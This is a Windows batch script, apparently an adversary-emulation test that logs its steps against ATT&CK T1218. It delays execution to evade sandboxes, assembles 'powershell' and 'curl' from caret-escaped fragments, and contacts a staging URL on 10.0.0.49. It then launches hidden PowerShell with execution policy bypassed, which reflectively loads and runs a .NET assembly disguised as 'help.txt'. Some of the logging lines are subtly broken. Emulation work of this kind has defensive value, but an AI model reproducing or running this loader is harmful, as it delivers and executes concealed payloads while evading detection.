@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET wqzxaf=%APPDATA%\7827\f32ed231
SET pklmnf=https://10.0.0.49
SET vbncfg=https://10.0.0.49/stage/2/icon.png?7827-10
SET rtyujk=ITZEL-S2BO
SET ghjklo=10
SET asdfgh=help.txt
SET zxcvbn=7827

REM Debug logging variables
SET logvar=%APPDATA%\!ghjklo!\macula-simulations.log
SET agentvar=!rtyujk!

REM Initial delay to evade sandbox analysis
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=initial_30s>>> "!logvar!" 2>nul
timeout /t 30 /nobreak >nul

REM Command fragmentation variables for LOLBIN obfuscation
SET p1=p^o^w
SET p2=e^r^s^h
SET p3=e^l^l^.
SET p4=e^x^e
SET c1=c^u^r^l
SET c2= ^-^k^ -^s^ -^o
SET c3= ^n^u^l

REM Construct obfuscated command strings
SET powexe=!p1!!p2!!p3!!p4!
SET curlexe=!c1!!c2!!c3!

REM DEBUG: Log command construction
echo [!DATE! !TIME!][DEBUG][!agentvar!]: cmd_construction=obfuscated_commands>>> "!logvar!" 2>nul

REM Random delay between 10-30 seconds
SET /A delay=%RANDOM% %% 20 + 10
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=random_%delay%s>>> "!logvar!" 2>nul
timeout /t %delay% /nobreak >nul

REM Step 1: Check server availability with obfuscated curl command
echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_start=checking>>> "!logvar!" 2>nul
%curlexe% "!vbncfg!"
IF ERRORLEVEL 1 (
    SET RESULT=0
    SET ERR_DETAIL=connection_failed
) ELSE (
    SET RESULT=1
    SET ERR_DETAIL=
)
echo [!DATE! !TIME!][DEBUG][!agentvar!]: heartbeat_complete=result_%RESULT%>>> "!logvar!" 2>nul

REM TTP logging for T1218 (curl usage)
FOR /F "tokens=2-4 delims=/ " %%a IN ('echo !DATE!') DO SET year=%%c
FOR /F "tokens=1-3 delims=:.," %%a IN ('echo !TIME!') DO SET hour=%%a&SET min=%%b&SET sec=%%c
SET timestamp=!year!-%%a-%%b !hour!:!min!:!sec!.%%c
(
    echo [!timestamp!][!agentvar!]: !ghjklo!-!zxcvbn!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!
) >> "!logvar!" 2>nul || echo >nul

REM Delay after heartbeat check
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=post_heartbeat_15s>>> "!logvar!" 2>nul
ping -n 15 127.0.0.1 >nul

REM Step 2: Change to output directory
echo [!DATE! !TIME!][DEBUG][!agentvar!]: chdir_start=!wqzxaf!>>> "!logvar!" 2>nul
cd /d "!wqzxaf!"
IF ERRORLEVEL 1 (
    SET RESULT=0
    SET ERR_DETAIL=directory_not_found
) ELSE (
    SET RESULT=1
    SET ERR_DETAIL=
)
echo [!DATE! !TIME!][DEBUG][!agentvar!]: chdir_complete=result_%RESULT%>>> "!logvar!" 2>nul

REM TTP logging for T1218 (directory change execution context)
FOR /F "tokens=2-4 delims=/ " %%a IN ('echo !DATE!') DO SET year=%%c
FOR /F "tokens=1-3 delims=:.," %%a IN ('echo !TIME!') DO SET hour=%%a&SET min=%%b&SET sec=%%c
SET timestamp=!year!-%%a-%%b !hour!:!min!:!sec!.%%c
(
    echo [!timestamp!][!agentvar!]: !ghjklo!-!zxcvbn!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!
) >> "!logvar!" 2>nul || echo >nul

REM Delay before DLL execution
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=pre_execution_10s>>> "!logvar!" 2>nul
CHOICE /C Y /N /D Y /T 10 >nul

REM Step 3: Execute .NET DLL via obfuscated PowerShell
echo [!DATE! !TIME!][DEBUG][!agentvar!]: dll_exec_start=!asdfgh!>>> "!logvar!" 2>nul

REM Build obfuscated PowerShell command fragments
SET ps1=-^n^o^p^ -^w
SET ps2= ^h^i^d^d^e^n^ -^e^p
SET ps3= ^b^y^p^a^s^s^ -^C^o^m^m^a^n^d
SET ps4= "^&^ { [R^e^f^l^e^c^t^i^o^n^.^A^s^s^e^m^b^l^y^]^:^:^L^o^a^d^([I^O^.^F^i^l^e^]^:^:^R^e^a^d^A^l^l^B^y^t^e^s^('
SET ps5= !asdfgh!
SET ps6= '^))^.^E^n^t^r^y^P^o^i^n^t^.^I^n^v^o^k^e^($n^u^l^l^,^ @^(^,[s^t^r^i^n^g^[^]^]^@^(^)^)^) ^}^"

REM Execute obfuscated PowerShell command
!powexe! !ps1!!ps2!!ps3! !ps4!!ps5!!ps6!
IF ERRORLEVEL 1 (
    SET RESULT=0
    SET ERR_DETAIL=assembly_load_failed
) ELSE (
    SET RESULT=1
    SET ERR_DETAIL=
)
echo [!DATE! !TIME!][DEBUG][!agentvar!]: dll_exec_complete=result_%RESULT%>>> "!logvar!" 2>nul

REM TTP logging for T1218 (PowerShell execution)
FOR /F "tokens=2-4 delims=/ " %%a IN ('echo !DATE!') DO SET year=%%c
FOR /F "tokens=1-3 delims=:.," %%a IN ('echo !TIME!') DO SET hour=%%a&SET min=%%b&SET sec=%%c
SET timestamp=!year!-%%a-%%b !hour!:!min!:!sec!.%%c
(
    echo [!timestamp!][!agentvar!]: !ghjklo!-!zxcvbn!-T1218|Signed Binary Proxy Execution=!RESULT!:!ERR_DETAIL!
) >> "!logvar!" 2>nul || echo >nul

REM Final delay before exit
echo [!DATE! !TIME!][DEBUG][!agentvar!]: delay_start=final_cleanup_5s>>> "!logvar!" 2>nul
timeout /t 5 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!agentvar!]: script_complete=all_operations>>> "!logvar!" 2>nul

ENDLOCAL